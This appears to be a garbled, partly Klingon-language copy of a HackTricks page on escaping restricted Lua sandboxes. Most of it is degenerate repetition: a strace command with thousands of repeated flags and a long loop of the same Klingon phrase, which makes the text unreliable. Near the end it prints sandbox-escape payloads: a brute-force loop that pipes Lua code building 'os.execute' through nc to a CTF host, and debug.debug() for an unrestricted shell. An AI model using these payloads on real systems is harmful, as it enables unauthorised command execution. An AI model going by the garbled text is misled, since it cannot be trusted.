1. **Static analysis**: This involves examining the library's source code or compiled binary to identify function names and their corresponding implementations. Tools such as `nm` or `objdump` can be used to extract this information.

2. **Dynamic analysis**: In this approach, you execute the library within a controlled environment and monitor the function calls made during runtime. Tools like `strace` or `ltrace` can be used to trace the execution and capture the function names.

3. **Symbol table analysis**: Libraries often contain a symbol table that stores information about the functions and variables within the library. Tools like `readelf` can be used to extract this information from the library.

## Example

Let's consider a scenario where we want to enumerate the functions of a library called `examplelib.so`. We can use the following commands to extract the function names:

- Static analysis using `nm`:

```bash
$ nm -D examplelib.so
```

- Dynamic analysis using `strace`:

```bash
$ strace -e trace=none -e signal=none -e read=none -e write=none -e open=none -e close=none -e fstat=none -e lseek=none -e mmap=none -e mprotect=none -e munmap=none -e brk=none -e rt_sigaction=none -e rt_sigprocmask=none -e ioctl=none -e access=none -e execve=none -e exit_group=none -e arch_prctl=none -e set_tid_address=none -e set_robust_list=none -e socket=none -e connect=none -e accept=none -e bind=none -e listen=none -e getsockname=none -e getpeername=none -e sendto=none -e recvfrom=none -e setsockopt=none -e getsockopt=none -e shutdown=none -e sendmsg=none -e recvmsg=none -e socketpair=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setfsuid=none -e setfsgid=none -e getfsuid=none -e getfsgid=none -e clone=none -e fork=none -e vfork=none -e execveat=none -e wait4=none -e kill=none -e uname=none -e semget=none -e semop=none -e semctl=none -e msgsnd=none -e msgrcv=none -e msgget=none -e msgctl=none -e shmat=none -e shmdt=none -e shmget=none -e shmctl=none -e getpriority=none -e setpriority=none -e sched_getscheduler=none -e sched_setscheduler=none -e sched_getparam=none -e sched_setparam=none -e sched_get_priority_max=none -e sched_get_priority_min=none -e sched_rr_get_interval=none -e mlock=none -e munlock=none -e mlockall=none -e munlockall=none -e prctl=none -e arch_prctl=none -e setrlimit=none -e getrlimit=none -e getrusage=none -e gettimeofday=none -e settimeofday=none -e adjtimex=none -e getcwd=none -e chdir=none -e fchdir=none -e mkdir=none -e rmdir=none -e creat=none -e link=none -e unlink=none -e symlink=none -e readlink=none -e chmod=none -e fchmod=none -e chown=none -e fchown=none -e lchown=none -e umask=none -e getuid=none -e geteuid=none -e getgid=none -e getegid=none -e getgroups=none -e setuid=none -e setgid=none -e setgroups=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getpgid=none -e setpgid=none -e setsid=none -e getsid=none -e getppid=none -e setreuid=none -e setregid=none -e getreuid=none -e getregid=none -e getgroups=none -e setgroups=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid=none -e setresuid=none -e setresgid=none -e getresuid=none -e getresgid
```bash
for k,v in pairs(string) do print(k,v) end
```
**ghItlhvam** 'ej **lua qutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e' vItlhutlh** *'e' vItlhutlh*. vaj **'e'
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Qapla'! Interactive lua shell yIqel**: vaj vIneHbe' limited lua shell DaH vIneHbe' lua shell (je vaj hopefully unlimited) jImej:
```bash
debug.debug()
```
## References

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
